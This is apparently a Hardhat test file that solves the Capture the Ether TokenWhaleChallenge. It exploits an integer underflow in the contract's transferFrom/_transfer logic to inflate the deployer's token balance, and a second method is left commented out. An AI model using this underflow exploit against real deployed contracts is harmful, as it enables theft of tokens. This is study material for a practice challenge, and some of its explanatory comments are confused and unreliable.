import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract, BigNumber } from 'ethers';
import { ethers } from 'hardhat';

describe('TokenWhaleChallenge', () => {
  it('exploit', async () => {
    /**
     * YOUR CODE HERE
     * */
    // The vulnerability is in the transferFrom function
    // the transferFrom function allows transferring tokens from another address (using an allowance)
    // without verifying that the sender of the transferFrom call has a balance of tokens.

    // 2 possible vulnerabilities:
    // Method 1: Lack of Overflow Protection
    // Method 2: No Protection Against Transfers to Zero Address
    // In transfer function: balanceOf[msg.sender] -= value;
    // We can inflate the account of the sender
    // DONT UNDERSTAND WHY DEPLOYER GETS INFLATED HERE!!

    // Totalsupply variable is not tracking correctly

    const [deployer, user] = await ethers.getSigners();

    // Deploy the contract and use deployerAddress (who receives 1000 tokens)
    const deployerAddress = await deployer.getAddress();
    const challengeFactory = await ethers.getContractFactory('TokenWhaleChallenge');
    const challengeContract = await challengeFactory.deploy(deployerAddress);
    await challengeContract.deployed();

    // Balance deployer at start should be 1000
    const balanceDeployerStart = await challengeContract.balanceOf(deployer.address);
    console.log('balanceDeployerStart: ' + balanceDeployerStart);

    // Approve token
    const approveToken = await challengeContract.connect(user).approve(deployer.address, 1000);
    await approveToken.wait();

    // STEP 1: Deployer transfers 510 tokens to other user
    // Deployer's balance then remains 490
    const transferToken = await challengeContract.connect(deployer).transfer(user.address, 510);
    await transferToken.wait();

    // Update and log the updated balances
    const balanceDeployerUpdate1 = await challengeContract.balanceOf(deployer.address);
    console.log('balanceDeployerUpdate: ' + balanceDeployerUpdate1);

    const balanceUserkerUpdate1 = await challengeContract.balanceOf(user.address);
    console.log('balanceUsererStart: ' + balanceUserkerUpdate1);

    // STEP 2: User now approves the deployer to spend 1000 tokens
    const approveTokenUser = await challengeContract.connect(user).approve(deployer.address, 1000);
    await approveTokenUser.wait();

    // STEP 3: Deployer now uses TransferFrom to send 510 tokens from user to user
    const transferToken2 = await challengeContract
      .connect(deployer)
      .transferFrom(user.address, user.address, 510);
    await transferToken2.wait();

    const balanceDeployerUpdate2 = await challengeContract.balanceOf(deployer.address);
    console.log('balanceDeployerUpdate2: ' + balanceDeployerUpdate2);

    const balanceUserkerUpdate2 = await challengeContract.balanceOf(user.address);
    console.log('balanceUserkerUpdate2: ' + balanceUserkerUpdate2);

    // The problem is in the _transfer function: balanceOf[msg.sender] -= value;
    // Step 1 results in Deployer's balance = 1000 - 510 = 490
    // Step 3 results in Deployer's balance = 490 - 510 ==> underflow ==> inflates balance!
    // This seems not intuitive but note that the deployer = msg.sender, so his balance gets inflated!

    // METHOD 2 (COMMENTED OUT)
    // const balanceUserStart = await challengeContract.balanceOf(user.address);
    // console.log('balanceUserStart: ' + balanceUserStart);

    // // Transfer 501 tokens deployer ==> user
    // // Deployer's balance = 499, User's balance = 501;
    // const transferToken = await challengeContract.connect(deployer).transfer(user.address, 501);
    // await transferToken.wait();

    // // The magic starts here: transferFrom(from, to, value)
    // // Here we exploit the lack of protection against transfers to the zero address:
    // const transferFromTx = await challengeContract
    //   .connect(deployer)
    //   .transferFrom(user.address, '0x0000000000000000000000000000000000000000', 500);
    // await transferFromTx.wait();

    // // Update and log the updated balances
    // const balanceDeployerUpdate2 = await challengeContract.balanceOf(deployer.address);
    // console.log('balanceDeployerUpdate: ' + balanceDeployerUpdate2.toString());

    // const balanceUserUpdate2 = await challengeContract.balanceOf(user.address);
    // console.log('balanceUserStart: ' + balanceUserUpdate2);

    expect(await challengeContract.isComplete()).to.be.true;
  });
});
